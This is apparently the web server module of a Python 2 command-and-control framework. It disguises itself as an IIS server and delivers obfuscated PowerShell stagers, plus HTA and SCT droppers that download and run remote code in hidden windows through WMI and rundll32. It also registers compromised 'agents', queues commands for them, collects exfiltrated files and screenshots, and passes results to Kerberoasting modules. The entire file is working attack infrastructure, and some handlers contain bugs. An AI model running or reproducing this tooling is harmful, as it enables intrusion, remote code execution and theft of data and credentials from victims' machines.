# Embedded file name: core\webserver.py

from core import config
from core import DA
from core import Kerberoast
from core.color import bcolors
from random import *
import time
from datetime import datetime
from core.Encryption import *
from core.config import AESKey
from core.config import *
import base64
import sys
import threading

from flask import *

SERVER_NAME = 'Microsoft-IIS/6.0'
class localFlask(Flask):
    def process_response(self, response):
    #Every response will be processed here first
        response.headers['server'] = SERVER_NAME
        return(response)

app = localFlask(__name__)
#app.logger.disabled = True

import logging
log = logging.getLogger('werkzeug')
#log.disabled = True
log.setLevel(logging.ERROR)

COUNT=0
#reload(sys)
#sys.setdefaultencoding('utf-8')




urls = ('/', 'index', raw_payload, 'payload', b52_payload, 'payloadc',b64_stager, 'stager',b52_stager, 'stager52', hjf_payload, 'payloadjf',b64_payload, 'base64', hjfs_payload, 'payloadjfs', sct_payload, 'sct', hta_payload, 'mshta', register_url+'/(.*)', 'info', download_url+'/(.*)', 'download', upload_url+'/(.*)', 'upload', image_url+'/(.*)', 'image', command_url+'/(.*)', 'command', result_url+'/(.*)', 'result', modules_url+'/(.*)', 'modules')


@app.route("/", methods=["GET"])
#def index(request):
def index():
    return "Oops... We Couldn't Find Your Page! (404 Error)"

def toB52(st):
    value = 0
    encoded = []
    while len(st) % 2 > 0:
        st = st + chr(0)

    for i in range(len(st)):
        value = value * 256 + ord(st[i])
        if (i + 1) % 2 == 0:
            for j in range(3):
                encoded.append(chr(40 + value % 52))
                value //= 52

    encoded.reverse()
    return ''.join(encoded)



@app.route(raw_payload, methods=["GET"])
def payload():
    ip = request.remote_addr
    p_out = '[+] Powershell PAYLOAD Send (%s)' % ip
    print bcolors.OKGREEN + p_out + bcolors.ENDC
    return PAYLOAD()

@app.route(b64_stager, methods=["GET"])
def stager():
    ip = request.remote_addr
    p_out = '[+] STAGER PAYLOAD Send (%s)' % ip
    print bcolors.OKGREEN + p_out + bcolors.ENDC
    return STAGER()

@app.route(b52_stager, methods=["GET"])
def stager52():
    ip = request.remote_addr
    p_out = '[+] STAGER PAYLOAD Send (%s)' % ip
    print bcolors.OKGREEN + p_out + bcolors.ENDC
    stager="$s=(new-object net.webclient).DownloadString('{HTTP}://{ip}:{port}{b52payload}');$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join('',$d));"
    if SSL==True:
        stager=stager.replace('{ip}', HOST).replace('{port}', PORT).replace('{raw}', raw_payload).replace('{b52payload}', b52_payload).replace('{b52payload}', b52_payload).replace('{HTTP}', "https")
    else :
        stager=stager.replace('{ip}', HOST).replace('{port}', PORT).replace('{raw}', raw_payload).replace('{b52payload}', b52_payload).replace('{b52payload}', b52_payload).replace('{HTTP}', "http")
    return stager


@app.route(b64_payload, methods=["GET"])
def base64():
    ip = request.remote_addr
    p_out = '[+] BASE64 Powershell PAYLOAD Send (%s)' % ip
    print bcolors.OKGREEN + p_out + bcolors.ENDC
    #payload.encode('base64').replace('\n', '')
    return PAYLOAD().encode('base64').replace('\n', '')


@app.route(b52_payload, methods=["GET"])
def payloadc():
    ip = request.remote_addr
    p_out = '[+] Powershell Encoded PAYLOAD Send (%s)' % ip
    print bcolors.OKGREEN + p_out + bcolors.ENDC
    payload = PAYLOAD()
    return toB52(payload)



@app.route(hjf_payload, methods=["GET"])
def payloadjf():
    ip = request.remote_addr
    p_out = '[+] Powershell JOB + File PAYLOAD Send (%s)' % ip
    print bcolors.OKGREEN + p_out + bcolors.ENDC
    payload = '$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString(\'{HTTP}://{ip}:{port}{b52payload}\');set-content -path c:\\programdata\\a.zip -value $S;set-content -path c:\\programdata\\b.ps1 -value ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\'{payload}\')));Start-Process powershell -ArgumentList "-exec bypass -w 1 -file c:\\programdata\\b.ps1" -WindowStyle Hidden;start-sleep 10;del c:\\programdata\\a.zip;del c:\\programdata\\b.ps1;'
    commandF = "$s=(get-content C:\\\\ProgramData\\\\a.zip);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join('',$d));"
    #payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{raw}', raw_payload).replace('{b52payload}', b52_payload).replace('{b64stager}', b64_stager).replace('{b52payload}', b52_payload).replace('{hjf}', hjf_payload).replace('{hjfs}', hjfs_payload).replace('{sct}', sct_payload).replace('{hta}', hta_payload)
    if SSL==True:
        payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{raw}', raw_payload).replace('{b52payload}', b52_payload).replace('{b64stager}', b64_stager).replace('{b52payload}', b52_payload).replace('{hjf}', hjf_payload).replace('{hjfs}', hjfs_payload).replace('{sct}', sct_payload).replace('{hta}', hta_payload).replace('{HTTP}', "https")
    else :
        payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{raw}', raw_payload).replace('{b52payload}', b52_payload).replace('{b64stager}', b64_stager).replace('{b52payload}', b52_payload).replace('{hjf}', hjf_payload).replace('{hjfs}', hjfs_payload).replace('{sct}', sct_payload).replace('{hta}', hta_payload).replace('{HTTP}', "http")
    commandF = commandF.encode('base64').replace('\n', '')
    payload = payload.replace('{payload}', commandF)
    payload = payload.encode('base64').replace('\n', '')
    payload = "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('%s')))}" % payload
    return payload


@app.route(hjfs_payload, methods=["GET"])
def payloadjfs():
    print "in"
    ip = request.remote_addr
    p_out = '[+] Powershell JOB + File +SCT PAYLOAD Send (%s)' % ip
    print bcolors.OKGREEN + p_out + bcolors.ENDC
    payload = '$V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;$S=$V.DownloadString(\'http://{ip}:{port}{b52payload}\');set-content -path c:\\programdata\\a.zip -value $S;$S=$V.DownloadString(\'http://{ip}:{port}{sct}\');set-content -path c:\\programdata\\sct.zip -value $S;set-content -path c:\\programdata\\sct.ps1 -value ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\'{payload}\')));set-content -path c:\\programdata\\sct.ini -value ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\'W3ZlcnNpb25dDQpTaWduYXR1cmU9JGNoaWNhZ28kDQoNCltFeGNlbF0NClVuUmVnaXN0ZXJPQ1hzPUV2ZW50TWFuYWdlcg0KDQpbRXZlbnRNYW5hZ2VyXQ0KJTExJVxzY3JvYmouZGxsLE5JLGM6L3Byb2dyYW1kYXRhL3NjdC56aXANCg0KW1N0cmluZ3NdDQpBcHBBY3QgPSAiU09GVFdBUkVcTWljcm9zb2Z0XENvbm5lY3Rpb24gTWFuYWdlciINClNlcnZpY2VOYW1lPSIgIg0KU2hvcnRTdmNOYW1lPSIgIg==\')));start-process rundll32.exe -ArgumentList "advpack.dll,LaunchINFSection C:\\ProgramData\\sct.ini,Excel,1," -WindowStyle Hidden;start-sleep 30;del c:\\programdata\\a.zip;del c:\\programdata\\sct.ps1;del c:\\programdata\\sct.zip;del c:\\programdata\\sct.ini;'
    commandF = "$s=(get-content C:\\\\ProgramData\\\\a.zip);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join('',$d));"
    payload = payload.replace('{ip}', HOST).replace('{port}', PORT).replace('{raw}', raw_payload).replace('{b52payload}', b52_payload).replace('{b64stager}', b64_stager).replace('{b52payload}', b52_payload).replace('{hjf}', hjf_payload).replace('{hjfs}', hjfs_payload).replace('{sct}', sct_payload).replace('{hta}', hta_payload)
    commandF = commandF.encode('base64').replace('\n', '')
    payload = payload.replace('{payload}', commandF)
    payload = payload.encode('base64').replace('\n', '')
    payload = "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('%s')))}" % payload
    return payload


@app.route(register_url, methods=["POST"])
def info():
    global COUNT
    data = request.form['data']
    id= request.form['resource']
    #request.args.get('page')
    if AGENTS.get(id) == None and data != None:
        data = data.split('**')
        ip = request.remote_addr
        data.insert(0, ip)
        data.insert(0, COUNT)
        #set_count(COUNT + 1)
        COUNT=COUNT+1
        p_out = '[+] New Agent Connected(%d): %s - %s\\%s' % (COUNT - 1,
             ip,
             data[6],
             data[7])
        print bcolors.OKGREEN + p_out + bcolors.ENDC
        AGENTS.update({id: data})
        COMMAND.update({id: []})
        TIME.update({id: time.time()})
            #print AESKey
    return AESKey


@app.route(upload_url, methods=["POST"])
def upload():
    try:
        #name = name.decode('base64').replace('\n', '')
        #name=request.args.get('page')
        name=request.form['file']
        id=request.form['resource']
        if AGENTS.get(id) != None and name != None:
            name=decrypt(AESKey,name)
            if len(name.split("\\"))>0:
                name=name.replace("\"","").split("\\")[-1]
            fp = open('file/' + name.replace('\00', ''), 'rb')
            file = fp.read()
                #file = file.encode('base64').replace('\n', '')
            file=encrypt(AESKey,file)
                #print file
            p_out = '[+] uploaded file %s' % name
            print bcolors.OKGREEN + p_out + bcolors.ENDC
            return file
        return "Error"
    except Exception as e:
        print '[-] Download: ' + str(e)
        return ''


@app.route(hta_payload, methods=["GET"])
def mshta():
    ip = request.remote_addr
    p_out = '[+] New Agent Request HTA PAYLOAD (%s)' % ip
    print bcolors.OKGREEN + p_out + bcolors.ENDC
        #code = '\n<html>\n<head>\n<script language="JScript">\nwindow.resizeTo(1, 1);\nwindow.moveTo(-2000, -2000);\nwindow.blur();\n\ntry\n{\n    window.onfocus = function() { window.blur(); }\n    window.onerror = function(sMsg, sUrl, sLine) { return false; }\n}\ncatch (e){}\n\nfunction replaceAll(find, replace, str) \n{\n  while( str.indexOf(find) > -1)\n  {\n    str = str.replace(find, replace);\n  }\n  return str;\n}\nfunction bas( string )\n    {\n        string = replaceAll(\']\',\'=\',string);\n        string = replaceAll(\'[\',\'a\',string);\n        string = replaceAll(\',\',\'b\',string);\n        string = replaceAll(\'@\',\'D\',string);\n        string = replaceAll(\'-\',\'x\',string);\n        string = replaceAll(\'~\',\'N\',string);\n        string = replaceAll(\'*\',\'E\',string);\n        string = replaceAll(\'%\',\'C\',string);\n        string = replaceAll(\'$\',\'H\',string);\n        string = replaceAll(\'!\',\'G\',string);\n        string = replaceAll(\'{\',\'K\',string);\n        string = replaceAll(\'}\',\'O\',string);\n        var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";\n        var result     = \'\';\n\n        var i = 0;\n        do {\n            var b1 = characters.indexOf( string.charAt(i++) );\n            var b2 = characters.indexOf( string.charAt(i++) );\n            var b3 = characters.indexOf( string.charAt(i++) );\n            var b4 = characters.indexOf( string.charAt(i++) );\n\n            var a = ( ( b1 & 0x3F ) << 2 ) | ( ( b2 >> 4 ) & 0x3 );\n            var b = ( ( b2 & 0xF  ) << 4 ) | ( ( b3 >> 2 ) & 0xF );\n            var c = ( ( b3 & 0x3  ) << 6 ) | ( b4 & 0x3F );\n\n            result += String.fromCharCode(a) + (b?String.fromCharCode(b):\'\') + (c?String.fromCharCode(c):\'\');\n\n        } while( i < string.length );\n\n        return result;\n    }\n\nvar es = \'{code}\';\neval(bas(es));\n</script>\n<hta:application caption="no" showInTaskBar="no" windowState="minimize" navigable="no" scroll="no" />\n</head>\n<body>\n</body>\n</html> \t\n\n'
        #code = '\n<html>\n<head>\n<script language="JScript">\nwindow.resizeTo(1, 1);\nwindow.moveTo(-2000, -2000);\nwindow.blur();\n\ntry\n{\n    window.onfocus = function() { window.blur(); }\n    window.onerror = function(sMsg, sUrl, sLine) { return false; }\n}\ncatch (e){}\n\nfunction replaceAll(find, replace, str) \n{\n  while( str.indexOf(find) > -1)\n  {\n    str = str.replace(find, replace);\n  }\n  return str;\n}\nfunction replace(string)\n{\n        string = replaceAll(\']\',\'=\',string);\n        string = replaceAll(\'[\',\'a\',string);\n        string = replaceAll(\',\',\'b\',string);\n        string = replaceAll(\'@\',\'D\',string);\n        string = replaceAll(\'-\',\'x\',string);\n        string = replaceAll(\'~\',\'N\',string);\n        string = replaceAll(\'*\',\'E\',string);\n        string = replaceAll(\'%\',\'C\',string);\n        string = replaceAll(\'$\',\'H\',string);\n        string = replaceAll(\'!\',\'G\',string);\n        string = replaceAll(\'{\',\'K\',string);\n        string = replaceAll(\'}\',\'O\',string);\n        return string;\n}\nfunction bas( string )\n    {\n string=replace(string);\n       var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";\n        var result     = \'\';\n\n        var i = 0;\n        do {\n            var b1 = characters.indexOf( string.charAt(i++) );\n            var b2 = characters.indexOf( string.charAt(i++) );\n            var b3 = characters.indexOf( string.charAt(i++) );\n            var b4 = characters.indexOf( string.charAt(i++) );\n\n            var a = ( ( b1 & 0x3F ) << 2 ) | ( ( b2 >> 4 ) & 0x3 );\n            var b = ( ( b2 & 0xF  ) << 4 ) | ( ( b3 >> 2 ) & 0xF );\n            var c = ( ( b3 & 0x3  ) << 6 ) | ( b4 & 0x3F );\n\n            result += String.fromCharCode(a) + (b?String.fromCharCode(b):\'\') + (c?String.fromCharCode(c):\'\');\n\n        } while( i < string.length );\n\n        return result;\n    }\n\nvar es = \'{code}\';\neval(bas(es));\n</script>\n<hta:application caption="no" showInTaskBar="no" windowState="minimize" navigable="no" scroll="no" />\n</head>\n<body>\n</body>\n</html> \t\n\n'
    code = '\n<html>\n<head>\n<script language="JScript">\nwindow.resizeTo(1, 1);\nwindow.moveTo(-2000, -2000);\nwindow.blur();\n\ntry\n{\n    window.onfocus = function() { window.blur(); }\n    window.onerror = function(sMsg, sUrl, sLine) { return false; }\n}\ncatch (e){}\n\nfunction replaceAll(find, replace, str) \n{\n  while( str.indexOf(find) > -1)\n  {\n    str = str.replace(find, replace);\n  }\n  return str;\n}\nfunction replace(string)\n{\n        string = replaceAll(\']\',\'=\',string);\n        string = replaceAll(\'[\',\'a\',string);\n        string = replaceAll(\',\',\'b\',string);\n        string = replaceAll(\'@\',\'D\',string);\n        string = replaceAll(\'-\',\'x\',string);\n        string = replaceAll(\'~\',\'N\',string);\n        string = replaceAll(\'*\',\'E\',string);\n        string = replaceAll(\'%\',\'C\',string);\n        string = replaceAll(\'$\',\'H\',string);\n        string = replaceAll(\'!\',\'G\',string);\n        string = replaceAll(\'{\',\'K\',string);\n        string = replaceAll(\'}\',\'O\',string);\n        return string;\n}\nfunction bas( string )\n    {\n string=replace(string);\n       var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";\n        var result     = \'\';\n\n        var i = 0;\n        do {\n            var b1 = characters.indexOf( string.charAt(i++) );\n            var b2 = characters.indexOf( string.charAt(i++) );\n            var b3 = characters.indexOf( string.charAt(i++) );\n            var b4 = characters.indexOf( string.charAt(i++) );\n\n            var a = ( ( b1 & 0x3F ) << 2 ) | ( ( b2 >> 4 ) & 0x3 );\n            var b = ( ( b2 & 0xF  ) << 4 ) | ( ( b3 >> 2 ) & 0xF );\n            var c = ( ( b3 & 0x3  ) << 6 ) | ( b4 & 0x3F );\n\n            result += String.fromCharCode(a) + (b?String.fromCharCode(b):\'\') + (c?String.fromCharCode(c):\'\');\n\n        } while( i < string.length );\n\n        return result;\n    }\n\nvar es = \'{code}\';\neval(bas(es));\n</script>\n<hta:application caption="no" showInTaskBar="no" windowState="minimize" navigable="no" scroll="no" />\n</head>\n<body>\n</body>\n</html> \t\n\n'
        #js = '\n\t\nvar cm="powershell -exec bypass -w 1 -c $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX($V.downloadstring(\'http://{ip}:{port}{raw}\'));";\nvar w32ps= GetObject(\'winmgmts:\').Get(\'Win32_ProcessStartup\');\nw32ps.SpawnInstance_();\nw32ps.ShowWindow=0;\nvar rtrnCode=GetObject(\'winmgmts:\').Get(\'Win32_Process\').Create(cm,\'c:\\\\\',w32ps,null);\n'
    js = '\n\t\nvar cm="powershell -w hidden Invoke-Expression(New-Object Net.WebClient).DownloadString(\'http://{ip}:{port}{b64stager}\');";\nvar w32ps= GetObject(\'winmgmts:\').Get(\'Win32_ProcessStartup\');\nw32ps.SpawnInstance_();\nw32ps.ShowWindow=0;\nvar rtrnCode=GetObject(\'winmgmts:\').Get(\'Win32_Process\').Create(cm,\'c:\\\\\',w32ps,null);\n'
    js = js.replace('{ip}', HOST).replace('{port}', PORT).replace('{raw}', raw_payload).replace('{b52payload}', b52_payload).replace('{b64stager}', b64_stager).replace('{b52payload}', b52_payload).replace('{hjf}', hjf_payload).replace('{hjfs}', hjfs_payload).replace('{sct}', sct_payload).replace('{hta}', hta_payload)
    js = js.encode('base64').replace('\n', '')
    re = [[']', '='],
         ['[', 'a'],
         [',', 'b'],
         ['@', 'D'],
         ['-', 'x'],
         ['~', 'N'],
         ['*', 'E'],
         ['%', 'C'],
         ['$', 'H'],
         ['!', 'G'],
         ['{', 'K'],
         ['}', 'O']]
    for i in re:
        js = js.replace(i[1], i[0])
    payload= open('payloads/mshta.js', 'w')
    payload.write(code.replace('{code}', js))
    payload.close()
    return code.replace('{code}', js)


@app.route(sct_payload, methods=["GET"])
def sct(request):
    ip = request.remote_addr
    p_out = '[+] New Agent Request SCT PAYLOAD (%s)' % ip
    print bcolors.OKGREEN + p_out + bcolors.ENDC
    code = '<?xml version="1.0" encoding="utf-8"?>\n<package>\n  <component>\n    <registration progid="y">\n      <script language="JScript"><![CDATA[\n\t\tfunction replaceAll(find, replace, str) \n\t\t{\n\t\t  while( str.indexOf(find) > -1)\n\t\t  {\n\t\t    str = str.replace(find, replace);\n\t\t  }\n\t\t  return str;\n\t\t}\n\t\tfunction bas( string )\n\t\t    {\n\t\t        string = replaceAll(\']\',\'=\',string);\n\t\t        string = replaceAll(\'[\',\'a\',string);\n\t\t        string = replaceAll(\',\',\'b\',string);\n\t\t        string = replaceAll(\'@\',\'D\',string);\n\t\t        string = replaceAll(\'-\',\'x\',string);\n\t\t        string = replaceAll(\'~\',\'N\',string);\n\t\t        string = replaceAll(\'*\',\'E\',string);\n\t\t        string = replaceAll(\'%\',\'C\',string);\n\t\t        string = replaceAll(\'$\',\'H\',string);\n\t\t        string = replaceAll(\'!\',\'G\',string);\n\t\t        string = replaceAll(\'{\',\'K\',string);\n\t\t        string = replaceAll(\'}\',\'O\',string);\n\t\t        var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";\n\t\t        var result     = \'\';\n\n\t\t        var i = 0;\n\t\t        do {\n\t\t            var b1 = characters.indexOf( string.charAt(i++) );\n\t\t            var b2 = characters.indexOf( string.charAt(i++) );\n\t\t            var b3 = characters.indexOf( string.charAt(i++) );\n\t\t            var b4 = characters.indexOf( string.charAt(i++) );\n\n\t\t            var a = ( ( b1 & 0x3F ) << 2 ) | ( ( b2 >> 4 ) & 0x3 );\n\t\t            var b = ( ( b2 & 0xF  ) << 4 ) | ( ( b3 >> 2 ) & 0xF );\n\t\t            var c = ( ( b3 & 0x3  ) << 6 ) | ( b4 & 0x3F );\n\n\t\t            result += String.fromCharCode(a) + (b?String.fromCharCode(b):\'\') + (c?String.fromCharCode(c):\'\');\n\n\t\t        } while( i < string.length );\n\n\t\t        return result;\n\t\t    }\n\n\t\tvar es = \'{code}\';\n\t\teval(bas(es));\n\t  ]]></script>\n    </registration>\n  </component>\n</package>\n'
        #code = '<?xml version="1.0" encoding="utf-8"?>\n<package>\n  <component>\n    <registration progid="y">\n      <script language="JScript"><![CDATA[\n\t\tfunction replaceAll(find, replace, str) \n\t\t{\n\t\t  while( str.indexOf(find) > -1)\n\t\t  {\n\t\t    str = str.replace(find, replace);\n\t\t  }\n\t\t  return str;\n\t\t}\n\t\tfunction replace(string){string = replaceAll(\']\',\'=\',string);\n\t\t        string = replaceAll(\'[\',\'a\',string);\n\t\t        string = replaceAll(\',\',\'b\',string);\n\t\t        string = replaceAll(\'@\',\'D\',string);\n\t\t        string = replaceAll(\'-\',\'x\',string);\n\t\t        string = replaceAll(\'~\',\'N\',string);\n\t\t        string = replaceAll(\'*\',\'E\',string);\n\t\t        string = replaceAll(\'%\',\'C\',string);\n\t\t        string = replaceAll(\'$\',\'H\',string);\n\t\t        string = replaceAll(\'!\',\'G\',string);\n\t\t        string = replaceAll(\'{\',\'K\',string);\n\t\t        string = replaceAll(\'}\',\'O\',string);\n\n\t\t        return string;\n\t\t    }\n\t\tfunction bas( string )\n\t\t    {\n\t\t        replace(string);\n\t\t        var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";\n\t\t        var result     = \'\';\n\n\t\t        var i = 0;\n\t\t        do {\n\t\t            var b1 = characters.indexOf( string.charAt(i++) );\n\t\t            var b2 = characters.indexOf( string.charAt(i++) );\n\t\t            var b3 = characters.indexOf( string.charAt(i++) );\n\t\t            var b4 = characters.indexOf( string.charAt(i++) );\n\n\t\t            var a = ( ( b1 & 0x3F ) << 2 ) | ( ( b2 >> 4 ) & 0x3 );\n\t\t            var b = ( ( b2 & 0xF  ) << 4 ) | ( ( b3 >> 2 ) & 0xF );\n\t\t            var c = ( ( b3 & 0x3  ) << 6 ) | ( b4 & 0x3F );\n\n\t\t            result += String.fromCharCode(a) + (b?String.fromCharCode(b):\'\') + (c?String.fromCharCode(c):\'\');\n\n\t\t        } while( i < string.length );\n\n\t\t        return result;\n\t\t    }\n\n\t\tvar es = \'{code}\';\n\t\teval(bas(es));\n\t  ]]></script>\n    </registration>\n  </component>\n</package>\n'
    js = '\n\t\nvar cm="powershell -exec bypass -w 1 -file c:\\\\programdata\\\\sct.ps1";\nvar w32ps= GetObject(\'winmgmts:\').Get(\'Win32_ProcessStartup\');\nw32ps.SpawnInstance_();\nw32ps.ShowWindow=0;\nvar rtrnCode=GetObject(\'winmgmts:\').Get(\'Win32_Process\').Create(cm,\'c:\\\\\',w32ps,null);\n'
    js = js.replace('{ip}', HOST).replace('{port}', PORT).replace('{raw}', raw_payload).replace('{b52payload}', b52_payload).replace('{b64stager}', b64_stager).replace('{b52payload}', b52_payload).replace('{hjf}', hjf_payload).replace('{hjfs}', hjfs_payload).replace('{sct}', sct_payload).replace('{hta}', hta_payload)
    js = js.encode('base64').replace('\n', '')
    re = [[']', '='],
         ['[', 'a'],
         [',', 'b'],
         ['@', 'D'],
         ['-', 'x'],
         ['~', 'N'],
         ['*', 'E'],
         ['%', 'C'],
         ['$', 'H'],
         ['!', 'G'],
         ['{', 'K'],
         ['}', 'O']]
    for i in re:
        js = js.replace(i[1], i[0])

    return code.replace('{code}', js)


@app.route(download_url, methods=["POST"])
def download():
    data = request.form['d']
    id= request.form['d']
    if AGENTS.get(id) != None and data != None:
        filename=request.form['f']
        filecontent=request.form['d']
        filecontent=decrypt_file(AESKey,filecontent.strip())
        fp = open('downloads/' +filename, 'wb')
        fp.write(filecontent)
        fp.close()
        p_out = '[+] Agent (%d) - %s send file(%s bytes)' % (AGENTS[id][0], AGENTS[id][7], len(data))
        print bcolors.OKGREEN + p_out + bcolors.ENDC
    return 'OK'


@app.route(image_url, methods=["POST"])
def image():
    id= request.form['resource']
    data = request.form['data']
    fn=id+''.join(random.choice(string.ascii_lowercase) for i in range(5))
    if AGENTS.get(id) != None and data != None:
        data = decrypt_file(AESKey,data.split(":")[1].split(":")[0])
        fp = open('images/%s.png' % fn, 'wb')
        fp.write(data)
        fp.close()
        p_out = '[+] Agent (%d) - %s send image(%s bytes)' % (AGENTS[id][0], AGENTS[id][7], len(data))
        print bcolors.OKGREEN + p_out + bcolors.ENDC
    return 'OK'


@app.route(command_url, methods=["POST"])
def command():
    #id= request.args.get('page')
    id=request.form['resource']
    if AGENTS.get(id) != None:
        TIME[id] = time.time()
    if AGENTS.get(id) != None and len(COMMAND.get(id)) > 0:
        cmd = COMMAND[id].pop(0)
        out=bcolors.OKGREEN + '[~] ' + id + ':' + decrypt(AESKey,cmd) + bcolors.ENDC
        print out
        history=file("c2-logs.txt","a")
        history.write('[~] ' + id + ':' + decrypt(AESKey,cmd)+"\n")
        history.close()
        return cmd
    elif AGENTS.get(id) == None:
        print bcolors.OKGREEN + '[~] ' + id + ':Register' + bcolors.ENDC
        return 'REGISTER'
    else:
        seed(datetime.now())
        rand1=randint(100,200)
        rand2=randint(80,150)
        return "".join([random.choice(string.ascii_uppercase) for i in range(rand1)])+"-*-*-*"+"".join([random.choice(string.ascii_uppercase) for i in range(rand2)])


@app.route(result_url, methods=["POST","GET"])
def result():
    #id= request.args.get('page')
    id=request.form['resource']
    data = request.form['data']
    #print id,data
    if AGENTS.get(id) != None and data != None:
        #data = data.decode('base64')
        data = decrypt(AESKey,data)
        data=data.encode('ascii','ignore')
        p_out = '[+] Agent (%d) - %s@%s\\%s send Result' % (AGENTS[id][0], AGENTS[id][7],AGENTS[id][6],AGENTS[id][5])
        history=file("c2-logs.txt","a")
        history.write(p_out+"\n")
        history.write(data.replace("\00"," ")+"\n")
        history.close()
        if data.find("Defense_Ananylsis_Module")>-1:
            print data.find("Defense_Ananylsis_Module")
            fname="DA/"+AGENTS[id][7]+"@"+AGENTS[id][6]+"DA_out.txt"
            da=open(fname,"w")
            da.write(data.replace("\00"," "))
            da.close()
            server = threading.Thread(target=DA.main, args=(fname,))
            server.start()
            return "OK"
        if data.find("Kerberoast-Module")>-1:
            print data.find("Kerberoast-Module")
            fname="kerberoast/"+AGENTS[id][7]+"@"+AGENTS[id][6]+"_kerb_out.txt"
            k=open(fname,"w")
            k.write(data.replace("\00"," "))
            k.close()
            server = threading.Thread(target=Kerberoast.kerb, args=(fname,AGENTS[id][7],AGENTS[id][6],))
            server.start()
            return "OK"
        print bcolors.OKGREEN + p_out + bcolors.ENDC
        print data
    else:
        return 'REGISTER'
    return 'ok'


@app.route(modules_url, methods=["POST"])
def modules():
    id= request.args.get('page')
    #id=request.form['resource']
    data = request.form['data']

    if AGENTS.get(id) != None and data != None:
        data=decrypt(AESKey,data).replace('\00', '')
        p_out = '[+] New Agent Request Module %s (%s - %s)' % (data, AGENTS[id][0], AGENTS[id][7])
        print bcolors.OKGREEN + p_out + bcolors.ENDC
        try:
            fpm = open('Modules/' + data, 'r')
            module = fpm.read()
            retmod=encrypt(AESKey,module)
            return retmod
            fpm.close()
        except Exception as e:
            print e
            return ''
    return 'OK'


def main():

    try:
        if SSL==True:
            host=['0.0.0.0',PORT]
            cert = {"ssl_context": (CERT, KEY)}
            thread = threading.Thread(target=app.run, args=(host), kwargs=cert)
            thread.daemon = True
            thread.start()
        else:
            host=['0.0.0.0',PORT]
            thread = threading.Thread(target=app.run, args=(host))
            thread.daemon = True
            thread.start()
        #app.run(host='0.0.0.0',port=PORT)
    except KeyboardInterrupt:
        pass
